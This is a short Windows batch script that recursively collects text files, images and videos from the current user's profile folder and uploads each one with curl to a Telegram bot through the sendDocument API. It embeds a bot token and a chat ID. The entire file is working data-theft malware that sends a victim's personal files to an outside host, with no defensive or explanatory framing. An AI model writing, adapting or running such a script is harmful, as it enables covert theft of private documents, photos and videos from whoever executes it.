@echo off
setlocal enabledelayedexpansion

:: Token of Telegram Bot
set TELEGRAM_BOT_TOKEN=8157478032:AAHF-ANPD_Hozyie-3Wk9XK4p0l51IPeejc
:: ID chat of bot
set TELEGRAM_CHAT_ID=1922428949

:: set valuable
set SEARCH_PATH=C:\Users\%USERNAME%
::set SEARCH_PATH=F:\file_name_extensions

powershell -Command ^
"$files = Get-ChildItem '%SEARCH_PATH%' -Recurse -Include *.txt,*.png,*.jpg,*.jpeg,*.mp4 -File -ErrorAction SilentlyContinue; ^
foreach ($f in $files) { ^
    $path = $f.FullName; ^
    cmd /c curl -F \"chat_id=%TELEGRAM_CHAT_ID%\" -F \"document=@$path\" https://api.telegram.org/bot%TELEGRAM_BOT_TOKEN%/sendDocument; ^
}"


pause
